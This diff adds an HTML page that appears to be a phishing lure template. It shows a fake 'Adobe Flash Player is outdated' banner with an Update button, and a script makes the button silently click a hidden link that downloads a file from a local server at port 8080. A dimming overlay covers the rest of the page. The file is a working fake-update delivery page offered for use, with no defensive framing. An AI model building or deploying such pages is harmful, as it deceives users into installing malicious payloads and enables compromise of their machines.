@@ -1,0 +1,87 @@
+<html>
+<head>
+<script></script>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body {
+  margin: 0;
+  font-family: Arial, Helvetica, sans-serif;
+}
+
+.header {
+  padding: 5px 16px;
+  background: #FFECB2;
+  color: black;
+}
+
+.sticky {
+  position: fixed;
+  top: 0;
+  width: 100%;
+}
+
+.button {
+    background-color: #008CBA;
+    border: none;
+    color: white;
+    padding: 3px 10px;
+    text-align: center;
+    text-decoration: none;
+    display: inline-block;
+    font-size: 16px;
+    margin: 4px 2px;
+    cursor: pointer;
+}
+#overlay {
+    position: fixed;
+    display: block;
+    width: 100%;
+    height: 100%;
+    top: 40;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background-color: rgba(0,0,0,0.5);
+    z-index: 2;
+    cursor: pointer;
+}
+</style>
+</head>
+
+<body>
+<div class="header" id="myHeader">
+    <img src='https://helpx.adobe.com/content/dam/help/mnemonics/flashplayer_app_RGB.svg' width=15></img><strong> Your version of Adobe Flash Player is outdated </strong> <button class="button">Update</button>
+
+</div>
+
+<div style="height:2000px;"><br></div>
+<div id="overlay"></div>
+
+<a href="http://localhost:8080/x/dw" id="download" hidden></a>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
+
+<script>
+// html overlay (for pop-up etc.)
+// document.getElementById("overlay").style.display = "none";
+document.getElementById("overlay").style.display = "block";
+
+window.onscroll = function() {myFunction()};
+
+var header = document.getElementById("myHeader");
+var sticky = header.offsetTop;
+
+function myFunction() {
+    if (window.pageYOffset > sticky) {
+        header.classList.add("sticky");
+    } else {
+        header.classList.remove("sticky");
+    }
+}
+$(document).ready(function(){
+    $("button").click(function(){
+        document.getElementById('download').click();
+    });
+});
+</script>
+</body>
+</html>
